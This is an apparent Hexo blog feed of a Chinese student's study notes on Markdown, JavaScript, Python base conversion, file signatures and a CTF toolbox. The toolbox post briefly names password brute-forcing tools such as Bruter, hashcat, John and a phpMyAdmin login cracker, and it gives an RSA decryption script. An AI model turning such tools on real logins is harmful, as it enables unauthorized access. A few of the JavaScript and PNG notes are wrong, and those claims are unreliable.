style="text-align:center">数字1</td></tr></tbody></table></div><ul><li>常用复制版本：</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 让表格居中显示的风格 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.center</span> </span></span><br><span class="line"><span class="language-css">&#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: auto;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: table;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-left</span>: auto;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-right</span>: auto;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 表格输入位置 --&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="注脚与注释"><a class="header-anchor" href="#注脚与注释">¶</a>注脚与注释</h2><ul><li>在文本后输入 [^数字] 添加注脚，在其它处输入 [^数字]: 添加注脚的解释。</li><li>在其它处输入 *[文本]: 添加注释，在原文本处会出现虚下划线，鼠标靠近虚下划线就会出现注释内容。</li><li><a href="https://www.jovi.cc/add-superscript-subscript-footnote-and-other-functions-to-hexo.html/">插件尝试</a><ul><li>H<sub>2</sub>O：H~2~O; H&lt;sub&gt;2&lt;/sub&gt;O</li><li>x<sup>2</sup>+：x^2^+; x&lt;sup&gt;2&lt;/sup&gt;+</li><li><u>Inserted</u>：&lt;u&gt;Inserted&lt;/u&gt;</li></ul></li></ul><h2 id="数学公式"><a class="header-anchor" href="#数学公式">¶</a>数学公式</h2><p>参考文章：<a href="https://blog.csdn.net/konglongdanfo1/article/details/85204312">markdown公式符号大全</a></p><h2 id="符号表情"><a class="header-anchor" href="#符号表情">¶</a>符号表情</h2><p>一些 Markdown 应用程序允许通过键入表情符号短代码来插入表情符号。这些以冒号开头和结尾，并包含表情符号的名称。<br>一些常见的表情符号简码列表见网页：<a href="https://gist.github.com/rxaviers/7360908">github markdown 表情符号标记的完整列表</a></p><h2 id="其他"><a class="header-anchor" href="#其他">¶</a>其他</h2><ul><li>在 CSDN 版的 Markdown 中，如果输入 ® 或 ® 会显示为 ® ，解决办法是：输入 (r) 或 (R) 即可。</li><li>花体字母：<br><img src="/img/markdown-github-vscode%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3_yinwen.png" alt="alt text"></li><li>HTML 字符代码 &lt; 在 Markdown 中显示 &lt; 字符<br>HTML 字符代码 &gt; 在 Markdown 中显示 &gt; 字符<br>HTML 字符代码 = 在 Markdown 中显示 = 字符<br>其他 HTML 特殊字符对应表请参考文章：<a href="https://blog.csdn.net/sunbocong/article/details/81032758">html中显示特殊符号（附带特殊字符对应表）</a></li></ul><h2 id="vscode图片直接拖拽粘贴与hexo兼容"><a class="header-anchor" href="#vscode图片直接拖拽粘贴与hexo兼容">¶</a>vscode图片直接拖拽粘贴与hexo兼容</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/19128537976">参考教程</a></li><li>设置 VSCode 的 Markdown &gt; Copy Files:Destination<ul><li>打开 vscode 设置界面，搜索“Markdown copy file”。按下图添加一个项目。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Item：**/*.md</span><br><span class="line">Vaule: /img/$&#123;documentBaseName&#125;_$&#123;fileName&#125;</span><br></pre></td></tr></table></figure><ul><li>打开新的 VSCode 窗口</li><li>然后以**/source/文件**为根目录打开新的VSCode窗口，然后在里面编写 markdown 文件。此时VSCode将会把图片自动粘贴在/source/img/文件夹下，Hexo 渲染出来的页面也能找到放有图片的/img/路径。</li><li>注意！！！：手动删除…变成![alt text](/img/xxx.png)不然网站无法识别！！！</li></ul><h2 id="hexo-blog-encrypt插件加密博客文章"><a class="header-anchor" href="#hexo-blog-encrypt插件加密博客文章">¶</a>hexo-blog-encrypt插件加密博客文章</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/113235573">参考教程1-知乎</a></li><li><a href="https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md">参考教程2-github</a></li><li>配置优先级：文章信息头 &gt; _config.yml (站点根目录下的) &gt; 默认配置</li><li></li></ul><h2 id="参考文章"><a class="header-anchor" href="#参考文章">¶</a>参考文章</h2><ul><li><a href="https://blog.csdn.net/weixin_49272453/article/details/147440391?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-147440391-blog-89300713.235%5Ev43%5Epc_blog_bottom_relevance_base9&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3">使用 VSCode 编写 Markdown 文件</a></li><li><a href="https://www.cnblogs.com/jianmuzi/p/16795528.html">Markdown表格居中显示</a></li><li><a href="https://zhuanlan.zhihu.com/p/19128537976">使用Vscode和Hexo编写博客时让程序找到正确的图片路径</a></li><li><a href="https://zhuanlan.zhihu.com/p/113235573">对 Hexo 博客文章进行加密</a></li><li><a href="https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md">hexo-blog-encrypt插件github中文README.md</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 语法笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
            <tag> github </tag>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf工具箱内容学习（未完成ing）</title>
      <link href="/2025/08/20/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/08/20/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3">暴力破解</a></li><li><a href="#%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E9%87%8C%E5%8F%AB%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8">文本处理（文件里叫“文本编辑器”）</a></li><li><a href="#%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81">编码解码</a></li><li><a href="#%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7">爆破工具</a></li><li><a href="#%E5%AF%86%E7%A0%81%E5%B7%A5%E5%85%B7">密码工具</a></li></ul><h2 id="暴力破解"><a class="header-anchor" href="#暴力破解">¶</a>暴力破解</h2><p><img src="../img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-1.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-1.png" alt="alt text"></p><ol><li>Ziperello：暴力破解zip文件密码/字典/模板，但没有字典只能破解六位密码</li><li>pkcrck不知道为什么电脑不能打开可能是win32版本所以打不开，但网上没找到其他版本的（待）</li><li>ARCHPR：暴力破解/字典/掩码（不确定的地方打上？就行）</li></ol><hr><h2 id="文本处理（文件里叫“文本编辑器”）"><a class="header-anchor" href="#文本处理（文件里叫“文本编辑器”）">¶</a>文本处理（文件里叫“文本编辑器”）</h2><p><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-2-1.png" alt="alt text"></p><ol><li>一个常见的010，我加了一个winhex（本来自己电脑的加进去了）</li></ol><hr><h2 id="编码解码"><a class="header-anchor" href="#编码解码">¶</a>编码解码</h2><p><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-3-1.png" alt="alt text"></p><ol><li>因式分解（yafu打开cmd使用，<br>分解因数n：.\yafu-x64.exe “factor(n)”<br>RSA常见脚本：</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><ol start="2"><li>CyberChef：解码编码插件，有搜索功能，魔法棒好用</li><li>RSATool：网上没找到，遇到题目再说</li><li>Converter：功能有点鸡肋，尝试一个题目，直接卡死了</li><li>CTFcrack：额离谱旧电脑显示皮下是stegsolve，实则是解码工具（后续再补充</li><li>与佛论禅（字面意思）</li><li>Base64（字面意思）</li><li>随波逐流（编码解码好东西）<br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_suibo.png" alt="alt text"></li><li>AZdecrypt：Z340黄道十二宫密码破解软件<br>使用：python移位+软件左框输入解密</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">%,,@*&gt;@?==%88%5</span></span><br><span class="line"><span class="string">,@%#@@90-7$^=*@</span></span><br><span class="line"><span class="string">17,(&gt;()1@##-\$40</span></span><br><span class="line"><span class="string">~,*6?#%#8#=75+1</span></span><br><span class="line"><span class="string">(*@*1%#&gt;,0@5)%?</span></span><br><span class="line"><span class="string">%*^=)&amp;&gt;=1%,+7&amp;#</span></span><br><span class="line"><span class="string">8681(+8*@@(,@@@</span></span><br><span class="line"><span class="string">#*=#\$3*#%,#%%,3</span></span><br><span class="line"><span class="string">,*+7,7+@===+)61</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">s = s.strip()</span><br><span class="line"> </span><br><span class="line">arr = s.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">16</span>):</span><br><span class="line">    tmp_s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> index, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(arr):</span><br><span class="line">        i = (<span class="number">2</span> * index + n) % <span class="number">15</span> - <span class="number">1</span></span><br><span class="line">        tmp_s += value[i]</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span>(tmp_s)</span><br></pre></td></tr></table></figure><ol start="10"><li>hashcat：cmd命令工具，原按钮无用，我加了exe文件按钮但具体用法是：##右键打开文件位置然后打开此处cmd##kali中自带！！！<br><a href="https://cloud.tencent.com/developer/article/2187201">https://cloud.tencent.com/developer/article/2187201</a><br>嗯，不是我现在用得上的高级东西，先浅放个使用方法网页，网页打不开去image文件夹找图片。<br><a href="https://www.cnblogs.com/Junglezt/p/16044372.html">https://www.cnblogs.com/Junglezt/p/16044372.html</a><br>后面搜索到的使用文档</li><li>CTF-Tools（原按钮失效，已删除重新添加exe文件可使用）<br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_CTF-Tools.png" alt="alt text"></li><li>破空（原来是无效按钮旧版3.0的，看到有3.3的（申请QQ群ing未替换））</li></ol><blockquote><p>3.3功能：<br>1）查找到flag其他模式可以右键转换（结果去哪了还不清楚）<br>2）文件可以直接拖进去<br>3.3注意：<br>1）关键字编码即将flag的base64编码、16进制一起搜索，但只对字符格式有效；<br>2）网页查找智能用正则匹配</p></blockquote><ol><li>CQR：二维码常见工具</li><li>Hash计算（字面意思吧。。遇到题目再说）</li><li>CaptfEncoder（原按钮无效，已删除重新添加exe文件可使用）：解码编码，有搜索功能</li><li>Apocalypso（原按钮无效，已删除重新添加exe文件可使用）：<br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_A.png" alt="alt text"></li><li>RSATool2v110（原按钮无效，已删除重新添加exe文件可使用）：<br>P、Q、R、D、E 分别就是 RSA 算法中的 p、q、N、d、e，右上角选择进制，注意：e 只有十六进制可用，左下角有一个 Factor N 的按钮，这是分解 N 的意思，点一下，会自动开始分解因数，得到 P、Q，Calc.D是计算按钮</li><li>MixedCS：DES加密软件</li><li>5bit编码：字面意思</li><li>SSLEye：编码解码工具，没有搜索功能<br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_SSL.png" alt="alt text"></li><li>在线。。。：字面意思</li><li>Ookbrainfuck：两种编码在线网站<br>Ook! has only three distinct syntax elements:<br>Ook.   /   Ook?   /   Ook!<br>Brainfuck语言用&gt; &lt; + - . , [ ]八种符号来替换C语言的各种语法和命令</li><li>brainfuck：字面意思吧但网页看不懂怎么操作</li><li>摩斯密码：好像打不开。。</li><li>quip词频分析：Quipqiup 是一个快速且自动化的密码求解器 by 埃德温 奥尔森。它可以解决常见的简单替换密码在报纸上，包括像 Cryptoquips 这样的谜题（在哪个词中边界被保留）。（遇到题目再说咯）</li><li>Playfair：（字面意思Playfair解码网站）</li><li>hillcipher：同上</li><li>熊说。。。：美化网站。。不知道怎么混进来的</li><li>malbolge：Malbolge 由 Ben Olmstead 于 1998 年发明，是一种深奥的编程语言，旨在尽可能难以编程。事实就是这样：-）（什么鬼东西哦编程在线网页？</li><li>Wingdings：将常规英文文本转换为可复制和粘贴的 Wingdings 文本</li><li>双hex：（字面意思two hex解码网站）</li><li>维吉利亚：<br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_V.png" alt="alt text"></li><li>切鲁：（混进来的鬼东西？</li><li>0宽1、0宽2、emoji-aes：打不开</li></ol><hr><h2 id="爆破工具"><a class="header-anchor" href="#爆破工具">¶</a>爆破工具</h2><p><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-4.png" alt="alt text"></p><ol><li>Bruter：爆破密码，ip+user用户名+dictionary</li><li>John：使用方式看下面网址，打不开看images文件夹，kali自带<br><a href="https://www.cnblogs.com/Junglezt/p/16048189.html">https://www.cnblogs.com/Junglezt/p/16048189.html</a></li><li>phpMyAdmin：字面意思暴力破解用户名密码</li><li>t00ls：看不懂搜不到跳过</li><li>。。。都看不懂，遇到题目再说好了</li></ol><hr><h2 id="密码工具"><a class="header-anchor" href="#密码工具">¶</a>密码工具</h2><p>（太多了bushi先放着）<br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-5.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-6.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-7.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-8.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-9.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-10.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-11.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-12.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-13.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-14.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-15.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-16.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-17.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-18.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-19.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-20.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-21.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-22.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-23.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-24.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-25.png" alt="alt text"><br><img src="/img/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0_1-26.png" alt="alt text"></p>]]></content>
      
      
      <categories>
          
          <category> ctf工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python代码和bat自动化存档</title>
      <link href="/2025/08/17/python%E4%BB%A3%E7%A0%81%E5%92%8Cbat%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AD%98%E6%A1%A3/"/>
      <url>/2025/08/17/python%E4%BB%A3%E7%A0%81%E5%92%8Cbat%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AD%98%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<ol><li><p>bat文件<br>@echo off<br>python “python文件绝对路径\文件名.py” &amp; pause<br>注意：<br>1）另存为时编码保存为ANSI，防止乱码<br>2）引号必须是英文引号</p></li><li><p>实现进制与字符串转换的python代码</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">astart = input(&#x27;输入待处理数字或字符串：&#x27;)</span><br><span class="line">#a = int(astart)</span><br><span class="line">bs = input(&#x27;输入选择：1=数字2=字符串&#x27;)</span><br><span class="line">b = int(bs)</span><br><span class="line">if b == 1:</span><br><span class="line">    c = int(input(&#x27;数字是1=二进制2=十进制3=十六进制4=八进制&#x27;))</span><br><span class="line">    if  c == 1:</span><br><span class="line">        a10 = int(astart,2)</span><br><span class="line">        print(&#x27;转为十进制为：&#x27;,a10,&#x27;\n转为八进制0o为：&#x27;,oct(a10),&#x27;\n转为十六进制0xc为：&#x27;,hex(a10))</span><br><span class="line">    elif c == 2:</span><br><span class="line">        a = int(astart)</span><br><span class="line">        a10 = a</span><br><span class="line">        print(&#x27;转为二进制0b为：&#x27;,bin(a),&#x27;\n转为八进制0o为：&#x27;,oct(a),&#x27;\n转为十六进制0xc为：&#x27;,hex(a))</span><br><span class="line">    elif c == 3:</span><br><span class="line">        a10 = int(astart,16)</span><br><span class="line">        print(&#x27;转为十进制为：&#x27;,a10,&#x27;\n转为八进制0o为：&#x27;,oct(a10),&#x27;\n转为十六进制0xc为：&#x27;,hex(a10))</span><br><span class="line">    elif c == 4:</span><br><span class="line">        a10 = int(astart,8)</span><br><span class="line">        print(&#x27;转为十进制为：&#x27;,a10,&#x27;\n转为八进制0o为：&#x27;,oct(a10),&#x27;\n转为十六进制0xc为：&#x27;,hex(a10))</span><br><span class="line">    by = a10.to_bytes((a10.bit_length() + 7) // 8, &#x27;big&#x27;)   # 大端</span><br><span class="line">    print(&#x27;转为字符串为：&#x27;,by)</span><br><span class="line">elif b == 2:</span><br><span class="line">    a2 = astart.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    a2_10 = int.from_bytes(a2,&#x27;big&#x27;)</span><br><span class="line">    print(&#x27;转为二进制0b为：&#x27;,bin(a2_10),&#x27;\n转为八进制0o为：&#x27;,oct(a2_10),&#x27;\n转为十六进制0xc为：&#x27;,hex(a2_10),&#x27;\n转为十进制为：&#x27;,a2_10)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识点笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js 笔记</title>
      <link href="/2025/08/17/js-%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/08/17/js-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>原先运行环境是网页，现在node能够模仿，所以本地运行需要下载node。<br>具体（在VScode中编辑）：<br>1新建html文件，！+Tab获得：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 &gt;Hello World!&lt;/h1&gt;</span><br><span class="line">    &lt;script src=&quot;文件名.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><body>处需要手动编辑：1）h1+Tab获得<h1 ></h1>标签，中间可编辑；2）script+Tab获得<script></script>标签，中间可编辑，但正常使用引用.js文件方式编辑，具体如上述代码。<p>2 javascript语法粗略学习</p><ol><li>打印函数</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">console.log(&#x27;hello world&#x27;);</span><br></pre></td></tr></table></figure><ol><li><p>变量：var全局变量,let可修改,const不可修改赋值对象</p></li><li><p>原生数据类型：string,number包括小数,boolean,null,undefined</p></li></ol><ol start="3"><li>undefined定义方法不是const而是：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let 变量名</span><br></pre></td></tr></table></figure><ol><li>类型检验方式：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">console.log(typeof 变量名);</span><br></pre></td></tr></table></figure><p>此时null输出object</p><ol><li>string<br>1、打印方法（新/旧）</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">console.log(&#x27;123&#x27;+变量名);</span><br><span class="line">//模板字符串 新方法：</span><br><span class="line">const hello = `Myname is $&#123;变量名&#125;`; </span><br><span class="line">console.log(hello);</span><br></pre></td></tr></table></figure><p>2、内置方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//变量名.length</span><br><span class="line">//.toUpperCase()/.toLowerCase大小写</span><br><span class="line">//.substring(a,b)截取[a,b)；并且可以后面叠加（如大小写）</span><br><span class="line">//.split(&#x27;&#x27;)分割成数组 最小以字母为单位 ‘’内传入分割依据</span><br></pre></td></tr></table></figure><ol><li>数组</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//1）构造方法</span><br><span class="line">//const 变量名 = new Array(1,2,3,4);</span><br><span class="line">//const 变量名 = [1,&#x27;1&#x27;,true];</span><br><span class="line">//2）索引</span><br><span class="line">//数组名[1]可直接获取/赋值</span><br><span class="line">//数组名.unshift(&#x27;dhkaju&#x27;)在最后加入数组</span><br><span class="line">//数组名.pop()删除最后</span><br><span class="line">//判断是否为数组Array.isArray(数组名)为bool值</span><br><span class="line">//数组名.indexOf(&#x27;数组内容&#x27;)为数组内容索引号</span><br></pre></td></tr></table></figure><ol><li>对象</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//const 对象名 = &#123;&#125;</span><br><span class="line">//属性可以TAB明确级别</span><br><span class="line">//调用</span><br><span class="line">//      对象名.属性名1，属性名2</span><br><span class="line">//      对象名.属性名1，属性名1.1</span><br><span class="line">//      对象名.属性名1[1]</span><br><span class="line">//剩余先跳过未学习</span><br></pre></td></tr></table></figure><ol><li>if</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (条件句)&#123;</span><br><span class="line">    内容</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    内容</span><br><span class="line">&#125;</span><br><span class="line">//条件句：===同时判断类型是否相同，==只判断内容</span><br><span class="line">//      ||或 &amp;&amp;且</span><br></pre></td></tr></table></figure><ol><li>三目运算符</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const color = x &gt; 10 ? &#x27;red&#x27; : &#x27;blue&#x27;;</span><br><span class="line">//x &gt; 10时color = &#x27;red&#x27;反之&#x27;blue&#x27;</span><br></pre></td></tr></table></figure><ol><li>swith条件语句</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">switch(color)&#123;</span><br><span class="line">    case &#x27;red&#x27;:</span><br><span class="line">        break;</span><br><span class="line">    default &#x27;blue&#x27;:</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>for while循环</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (let i = 0;i &lt;= 10; i++)&#123;</span><br><span class="line">    内容</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">let i = 0</span><br><span class="line">while(i &lt; 10)&#123;</span><br><span class="line">    内容</span><br><span class="line">    i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 语法笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十六进制文件头尾特征</title>
      <link href="/2025/08/16/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%A4%B4%E5%B0%BE%E7%89%B9%E5%BE%81/"/>
      <url>/2025/08/16/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%A4%B4%E5%B0%BE%E7%89%B9%E5%BE%81/</url>
      
        <content type="html"><![CDATA[<p>##JPEG 图像文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FFD8 FFE0 0010 4A46 4946 0001 0101 0047 ...</span><br></pre></td></tr></table></figure><p>FFD8 表示 JPEG 文件的开始，FFE0 代表应用程序特定标记，4A46 4946 表示 “JFIF” 标识。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">... FFD9</span><br></pre></td></tr></table></figure><p>##PNG 图像文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8950 4E47 0D0A 1A0A ...</span><br></pre></td></tr></table></figure><p>PNG 文件的标准签名，其中 8950 4E47 对应 ASCII 编码的 %PNG。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">... 0000 0000 4945 4E44 AE42 6082</span><br></pre></td></tr></table></figure><p>4945 4E44 对应 ASCII 编码的 IEND，AE42 6082 是 CRC 校验码。</p><p>##PDF 文档<br>以 %PDF 开头，具体的十六进制表示如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2550 4446 2D31 2E3X ...</span><br></pre></td></tr></table></figure><p>2550 4446 对应 ASCII 编码的 %PDF，2D31 2E3X 代表 PDF 的版本号。<br>文件尾通常包含 %%EOF 标记，具体的十六进制表示如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">... 2525 454F 46</span><br></pre></td></tr></table></figure><p>2525 454F 46 对应 ASCII 编码的 %%EOF。</p><p>##DOC 文件（Microsoft Word 97-2003）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D0 CF 11 E0 A1 B1 1A E1 ...</span><br></pre></td></tr></table></figure><p>这个签名是 Microsoft 复合文件二进制格式（Compound File Binary Format, CFBF）的标志，常用于旧版 Microsoft Office 文档。<br>文件尾没有固定的模式，但通常包含结束标记，如 00 00 00 